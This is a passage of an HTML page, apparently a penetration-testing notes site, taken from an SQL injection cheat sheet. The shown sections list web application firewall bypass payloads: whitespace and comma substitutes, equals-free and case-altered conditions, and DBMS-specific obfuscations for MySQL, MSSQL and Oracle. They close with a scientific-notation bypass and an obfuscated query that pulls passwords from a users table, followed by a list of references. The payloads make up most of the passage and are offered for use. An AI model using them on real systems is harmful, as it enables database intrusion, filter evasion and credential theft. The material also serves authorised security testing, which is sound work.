style="color:#ae81ff">1</span>F, <span style="color:#ae81ff">20</span> <span style="color:#f92672">|</span>
</span></span></code></pre></div><p>Example of query where spaces were replaced by ascii characters above 0x80</p>
<pre tabindex="0"><code>♀SELECT§*⌂FROM☺users♫WHERE♂1☼=¶1‼
</code></pre><h3 id="no-comma">
  No Comma
  <a class="anchor" href="#no-comma">#</a>
</h3>
<p>Bypass using OFFSET, FROM and JOIN</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>         <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">OFFSET</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>SUBSTR(<span style="color:#e6db74">&#39;SQL&#39;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) <span style="color:#f92672">-&gt;</span> SUBSTR(<span style="color:#e6db74">&#39;SQL&#39;</span> <span style="color:#66d9ef">FROM</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">FOR</span> <span style="color:#ae81ff">1</span>).
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>    <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> (<span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>)a <span style="color:#66d9ef">JOIN</span> (<span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">2</span>)b <span style="color:#66d9ef">JOIN</span> (<span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">3</span>)<span style="color:#66d9ef">c</span> <span style="color:#66d9ef">JOIN</span> (<span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">4</span>)d
</span></span></code></pre></div><h3 id="no-equal">
  No Equal
  <a class="anchor" href="#no-equal">#</a>
</h3>
<p>Bypass using LIKE/NOT IN/IN/BETWEEN</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">substring</span>(<span style="color:#66d9ef">version</span>(),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">like</span>(<span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">substring</span>(<span style="color:#66d9ef">version</span>(),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">not</span> <span style="color:#66d9ef">in</span>(<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">substring</span>(<span style="color:#66d9ef">version</span>(),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">in</span>(<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">substring</span>(<span style="color:#66d9ef">version</span>(),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">between</span> <span style="color:#ae81ff">3</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">4</span>
</span></span></code></pre></div><h3 id="case-modification">
  Case modification
  <a class="anchor" href="#case-modification">#</a>
</h3>
<p>Bypass using uppercase/lowercase (see keyword AND)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">#</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AnD</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">#</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">aNd</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">#</span>
</span></span></code></pre></div><p>Bypass using keywords case insensitive / Bypass using an equivalent operator</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">AND</span>   <span style="color:#f92672">-&gt;</span> <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">OR</span>    <span style="color:#f92672">-&gt;</span> <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>     <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">LIKE</span>,REGEXP, <span style="color:#66d9ef">BETWEEN</span>, <span style="color:#66d9ef">not</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">not</span> <span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> X   <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">not</span> <span style="color:#66d9ef">between</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">and</span> X
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">HAVING</span>
</span></span></code></pre></div><h3 id="obfuscation-by-dbms">
  Obfuscation by DBMS
  <a class="anchor" href="#obfuscation-by-dbms">#</a>
</h3>
<p>MySQL</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span>.<span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>.<span style="color:#ae81ff">2</span><span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>e0UNION	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span><span style="color:#960050;background-color:#1e0010">\</span>N<span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>.e3UNION	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>e1AND<span style="color:#f92672">-</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span><span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#75715e">/*!12345UNION/*!31337SELECT/*!table_name*/	
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">{ts	1}UNION	SELECT.``	1.e.table_name	
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">SELECT	$.``	1.e.table_name	
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">SELECT{_	.``1.e.table_name}	
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">SELECT	LightOS	.	``1.e.table_name	LightOS	
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">SELECT	information_schema 1337.e.tables	13.37e.table_name	
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">SELECT	1	from	information_schema 9.e.table_name
</span></span></span></code></pre></div><p>MSSQL</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>.<span style="color:#ae81ff">1</span><span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>.<span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>.<span style="color:#ae81ff">2</span><span style="color:#66d9ef">alias</span>	
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>e0UNION	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>e1AND<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span><span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">0</span>xUNION	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">1</span><span style="color:#66d9ef">UNION</span>	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">1</span><span style="color:#66d9ef">FROM</span>[<span style="color:#66d9ef">table</span>]<span style="color:#66d9ef">WHERE</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">1</span><span style="color:#66d9ef">AND</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">1</span>	
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span><span style="color:#e6db74">&#34;table_name&#34;</span><span style="color:#66d9ef">FROM</span>[information_schema].[tables]	
</span></span></code></pre></div><p>Oracle</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span>FUNION	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>DUNION	<span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">2</span>	
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span>	<span style="color:#ae81ff">0</span>x7461626c655f6e616d65	<span style="color:#66d9ef">FROM</span>	all_tab_tables
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span>	CHR(<span style="color:#ae81ff">116</span>)	<span style="color:#f92672">||</span>	CHR(<span style="color:#ae81ff">97</span>)	<span style="color:#f92672">||</span>	CHR(<span style="color:#ae81ff">98</span>)	<span style="color:#66d9ef">FROM</span>	all_tab_tables
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#66d9ef">table_name</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#66d9ef">FROM</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span>all_tab_tables
</span></span></code></pre></div><h3 id="more-mysql-specific">
  More MySQL specific
  <a class="anchor" href="#more-mysql-specific">#</a>
</h3>
<p><code>information_schema.tables</code> alternative</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> mysql.innodb_table_stats;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> database_name  <span style="color:#f92672">|</span> <span style="color:#66d9ef">table_name</span>            <span style="color:#f92672">|</span> last_update         <span style="color:#f92672">|</span> n_rows <span style="color:#f92672">|</span> clustered_index_size <span style="color:#f92672">|</span> sum_of_other_index_sizes <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> dvwa           <span style="color:#f92672">|</span> guestbook             <span style="color:#f92672">|</span> <span style="color:#ae81ff">2017</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span> <span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">02</span>:<span style="color:#ae81ff">57</span> <span style="color:#f92672">|</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span>                    <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span>                        <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> dvwa           <span style="color:#f92672">|</span> users                 <span style="color:#f92672">|</span> <span style="color:#ae81ff">2017</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span> <span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">03</span>:<span style="color:#ae81ff">07</span> <span style="color:#f92672">|</span>      <span style="color:#ae81ff">5</span> <span style="color:#f92672">|</span>                    <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span>                        <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">show</span> tables <span style="color:#66d9ef">in</span> dvwa;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> Tables_in_dvwa <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> guestbook      <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> users          <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------+
</span></span></span></code></pre></div><p>Version Alternative</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> <span style="color:#f92672">@@</span>innodb_version;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#f92672">@@</span>innodb_version <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">31</span>           <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> <span style="color:#f92672">@@</span><span style="color:#66d9ef">version</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#f92672">@@</span><span style="color:#66d9ef">version</span>               <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">31</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0</span>ubuntu0.<span style="color:#ae81ff">15</span>.<span style="color:#ae81ff">10</span>.<span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> <span style="color:#66d9ef">version</span>();
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#66d9ef">version</span>()               <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">31</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0</span>ubuntu0.<span style="color:#ae81ff">15</span>.<span style="color:#ae81ff">10</span>.<span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-------------------------+
</span></span></span></code></pre></div><h4 id="waf-bypass-for-mysql-using-scientific-notation">
  WAF bypass for MySQL using scientific notation
  <a class="anchor" href="#waf-bypass-for-mysql-using-scientific-notation">#</a>
</h4>
<p>Blocked</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; or &#39;&#39;=&#39;</span>
</span></span></code></pre></div><p>Working</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; or 1.e(&#39;&#39;)=&#39;</span>
</span></span></code></pre></div><p>Obfuscated query</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span>.e(ascii <span style="color:#ae81ff">1</span>.e(<span style="color:#66d9ef">substring</span>(<span style="color:#ae81ff">1</span>.e(<span style="color:#66d9ef">select</span> password <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">limit</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>.e,<span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>.e) <span style="color:#ae81ff">1</span>.e,<span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>.e,<span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>.e)<span style="color:#ae81ff">1</span>.e)<span style="color:#ae81ff">1</span>.e) <span style="color:#f92672">=</span> <span style="color:#ae81ff">70</span> <span style="color:#66d9ef">or</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;2
</span></span></span></code></pre></div><h2 id="references">
  References
  <a class="anchor" href="#references">#</a>
</h2>
<ul>
<li>Detect SQLi
<ul>
<li><a href="https://gerbenjavado.com/manual-sql-injection-discovery-tips/">Manual SQL Injection Discovery Tips</a></li>
<li><a href="https://sqlwiki.netspi.com/">NetSPI SQL Injection Wiki</a></li>
</ul>
</li>
<li>MySQL:
<ul>
<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">PentestMonkey&rsquo;s mySQL injection cheat sheet</a></li>
<li><a href="https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/">Reiners mySQL injection Filter Evasion Cheatsheet</a></li>
<li><a href="https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/">Alternative for Information_Schema.Tables in MySQL</a></li>
<li><a href="https://websec.ca/kb/sql_injection">The SQL Injection Knowledge base</a></li>
</ul>
</li>
<li>MSSQL:
<ul>
<li><a href="http://evilsql.com/main/page2.php">EvilSQL&rsquo;s Error/Union/Blind MSSQL Cheatsheet</a></li>
<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">PentestMonkey&rsquo;s MSSQL SQLi injection Cheat Sheet</a></li>
</ul>
</li>
<li>ORACLE:
<ul>
<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">PentestMonkey&rsquo;s Oracle SQLi Cheatsheet</a></li>
</ul>
</li>
<li>POSTGRESQL:
<ul>
<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet">PentestMonkey&rsquo;s Postgres SQLi Cheatsheet</a></li>
</ul>
</li>
<li>Others
<ul>
<li><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">SQLi Cheatsheet - NetSparker</a></li>
<li><a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">Access SQLi Cheatsheet</a></li>
<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet">PentestMonkey&rsquo;s Ingres SQL Injection Cheat Sheet</a></li>
<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet">Pentestmonkey&rsquo;s DB2 SQL Injection Cheat Sheet</a></li>
<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet">Pentestmonkey&rsquo;s Informix SQL Injection Cheat Sheet</a></li>
<li><a href="https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet">SQLite3 Injection Cheat sheet</a></li>
<li><a href="http://rails-sqli.org/">Ruby on Rails (Active Record) SQL Injection Guide</a></li>
<li><a href="http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html">ForkBombers SQLMap Tamper Scripts Update</a></li>
<li><a href="https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/">SQLi in INSERT worse than SELECT</a></li>
<li><a href="https://gerbenjavado.com/manual-sql-injection-discovery-tips/">Manual SQL Injection Tips</a></li>
</ul>
</li>
<li>Second Order:
<ul>
<li><a href="https://www.notsosecure.com/analyzing-cve-2018-6376/">Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection</a></li>
<li><a href="https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/">Exploiting Second Order SQLi Flaws by using Burp &amp; Custom Sqlmap Tamper</a></li>
</ul>
</li>
<li>Sqlmap:
<ul>
<li><a href="https://twitter.com/zh4ck/status/972441560875970560">#SQLmap protip @zh4ck</a></li>
</ul>
</li>
<li>WAF:
<ul>
<li><a href="https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf">SQLi Optimization and Obfuscation Techniques</a> by Roberto Salgado</li>
<li><a href="https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/">A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection</a></li>
</ul>
</li>
</ul>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">


  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/75f0a66614fa426f8abba2c6d831f05bf85bfab5" title='Last modified by Stuart Gray | January 27, 2023' target="_blank" rel="noopener">
      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
      <span>January 27, 2023</span>
    </a>
  </div>




</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      <div class="book-toc-content">
        
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#sql-injection">SQL injection</a>
      <ul>
        <li><a href="#entry-point-detection">Entry point detection</a></li>
        <li><a href="#dbms-identification">DBMS Identification</a></li>
        <li><a href="#sql-injection-using-sqlmap">SQL injection using SQLmap</a>
          <ul>
            <li><a href="#basic-arguments-for-sqlmap">Basic arguments for SQLmap</a></li>
            <li><a href="#load-a-request-file-and-use-mobile-user-agent">Load a request file and use mobile user-agent</a></li>
            <li><a href="#custom-injection-in-useragentheaderreferercookie">Custom injection in UserAgent/Header/Referer/Cookie</a></li>
            <li><a href="#second-order-injection">Second order injection</a></li>
            <li><a href="#shell">Shell</a></li>
            <li><a href="#crawl-a-website-with-sqlmap-and-auto-exploit">Crawl a website with SQLmap and auto-exploit</a></li>
            <li><a href="#using-tor-with-sqlmap">Using TOR with SQLmap</a></li>
            <li><a href="#using-a-proxy-with-sqlmap">Using a proxy with SQLmap</a></li>
            <li><a href="#using-chrome-cookie-and-a-proxy">Using Chrome cookie and a Proxy</a></li>
            <li><a href="#using-suffix-to-tamper-the-injection">Using suffix to tamper the injection</a></li>
            <li><a href="#general-tamper-option-and-tampers-list">General tamper option and tamper&rsquo;s list</a></li>
            <li><a href="#sqlmap-without-sql-injection">SQLmap without SQL injection</a></li>
          </ul>
        </li>
        <li><a href="#authentication-bypass">Authentication bypass</a></li>
        <li><a href="#authentication-bypass-raw-md5-sha1">Authentication Bypass (Raw MD5 SHA1)</a></li>
        <li><a href="#polyglot-injection-multicontext">Polyglot injection (multicontext)</a></li>
        <li><a href="#routed-injection">Routed injection</a></li>
        <li><a href="#insert-statement---on-duplicate-key-update">Insert Statement - ON DUPLICATE KEY UPDATE</a></li>
        <li><a href="#waf-bypass">WAF Bypass</a>
          <ul>
            <li><a href="#white-spaces-alternatives">White spaces alternatives</a></li>
            <li><a href="#no-comma">No Comma</a></li>
            <li><a href="#no-equal">No Equal</a></li>
            <li><a href="#case-modification">Case modification</a></li>
            <li><a href="#obfuscation-by-dbms">Obfuscation by DBMS</a></li>
            <li><a href="#more-mysql-specific">More MySQL specific</a></li>
          </ul>
        </li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>


 
      </div>
    </aside>
    
  </main>

  
</body>
</html>












